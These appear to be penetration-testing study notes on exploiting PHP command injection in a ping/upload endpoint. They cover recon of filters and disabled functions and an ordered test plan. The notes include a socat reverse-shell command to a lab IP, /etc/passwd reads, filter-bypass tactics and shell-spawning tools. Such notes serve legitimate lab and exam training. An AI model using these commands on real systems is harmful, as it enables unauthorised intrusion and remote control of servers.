- We first Need to determine the Security Defenses in place by  reading through a file inclusion,  the upload/ping.php the backend page responsible for filtering/ sending the request"
- 
- test basic commands
- test bypasses
- test native/pre-installed tools such as netcat or socat
```shell-session
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

## Initial reconnaissance (what to read / where to look)

- Read the relevant backend files or hints (e.g. `upload/ping.php`
    
- Look for sanitization: `escapeshellarg()`, `escapeshellcmd()`, regex filters, `preg_replace`, `str_replace`, whitelist/blacklist arrays.
### Look for disabled php functions, via phpinfo() command
- there are auto bypass php files on github that bypasses these disabled functions by finding functions that are enabled and vulnerable.

- Check how input is integrated in the command: quoted? concatenated? passed into `shell_exec()` directly or inserted into a system call? Quoted input typically harder to inject; unquoted input is easier.
    
- Note any allowed characters or strict filters, file reads/inclusions, or presence of safe wrappers (e.g., `escapeshellarg`).
    
---

## 2. Determine Security Defenses in place

- **Input filtering**: what characters are removed/escaped (e.g., `;`, `|`, `&`, `` ` ``, `$(`, `>`)?
    
- **Quoting context**: input inside single quotes `'` vs double quotes `"` vs unquoted — influences payload style.
    
- **Whitelisting vs blacklisting**: whitelists are easier to validate; blacklists can often be bypassed.
    
- __Use of escapeshell__ _functions_*: may mitigate common separators but still vulnerable to other techniques.
    
- **SAPI restrictions**: some runtime environments (e.g., `popen` disabled, `disable_functions` in php.ini) prevent commands.
    
- **App-level restrictions**: allowed commands list (e.g., `ping -c 1` only), parameterized calls.
    
- **OS-level defenses**: AppArmor/SELinux, execution PATH restrictions, non-root user, no net access from container.
    

Record the defenses you observe — these determine which bypasses to try.

---

## 3. Test plan (order of actions)

1. **Safe discovery** — send benign payloads that show command output context (e.g., `; echo abc123` or `| echo abc123`).
    
2. **Test basic commands** — `id`, `whoami`, `pwd`, `ls -la`.
    
3. **Enumerate environment** — `env`, `cat /etc/passwd` (careful in exams—only when allowed), `ps aux`.
    
4. **Test common separators & encodings** — `;`, `&&`, `||`, `|`, newlines, backticks, `$()`.
    
5. **Test bypasses** — URL encoding, double encoding, using alternative separators (e.g., ), using `printf` to construct characters, using logical operators, using command redirections.
    
6. **Test native tools** — `nc`, `socat`, `bash -i`, `python -c`, `perl -e`, `telnet` if present.
    
7. **Establish a stable shell** — reverse shell (if allowed), bind shell, or other channels.
    
8. **Capture evidence** — command output, server logs, screenshots, and proof files.